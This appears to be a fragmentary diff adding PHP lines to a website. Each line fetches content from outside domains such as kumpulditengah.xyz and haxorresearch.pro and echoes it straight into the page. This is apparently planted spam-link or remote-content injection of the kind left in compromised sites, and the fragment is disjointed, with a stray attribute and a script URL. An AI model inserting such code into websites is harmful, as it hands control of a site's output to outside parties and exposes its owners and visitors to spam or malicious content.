@@ -1,0 +1,12 @@
+$a = file_get_contents('https://kumpulditengah.xyz/domvn/'); echo $a; ?>
+
+<?php $a = file_get_contents('https://kumpulditengah.xyz/domainaccid/'); echo $a; ?>
+
+<?php $anan=file_get_contents("https://haxorresearch.pro/bl/"); ?> <?=$anan; ?>
+
+//echo file_get_contents("https://kumpulditengah.xyz/domvn/");
+
+
+rel="sponsored"
+
+https://g.lazdcddn.com/g/lzdmod/channel/js/1.9.5/prot.js
